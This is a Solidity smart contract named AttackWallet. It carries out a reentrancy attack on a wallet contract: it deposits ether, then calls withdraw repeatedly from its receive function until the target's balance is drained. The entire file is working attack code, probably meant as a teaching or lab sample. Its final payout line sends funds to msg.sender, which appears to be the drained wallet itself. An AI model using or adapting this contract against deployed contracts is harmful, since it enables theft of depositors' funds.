//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;

interface Iwallet {
  function deposit() external payable;
  function withdraw() external;
}

contract AttackWallet  {
  Iwallet public immutable iwallet;

  constructor(address _walletAddress) {
    iwallet = Iwallet(_walletAddress);
  }

  function attack() external payable  {
    iwallet.deposit{ value: msg.value }();
    iwallet.withdraw();
  }

  receive() external payable {
    if (address(iwallet).balance > 0) {
      iwallet.withdraw();
    } else {
      payable(msg.sender).transfer(address(this).balance);
    }
  }
} 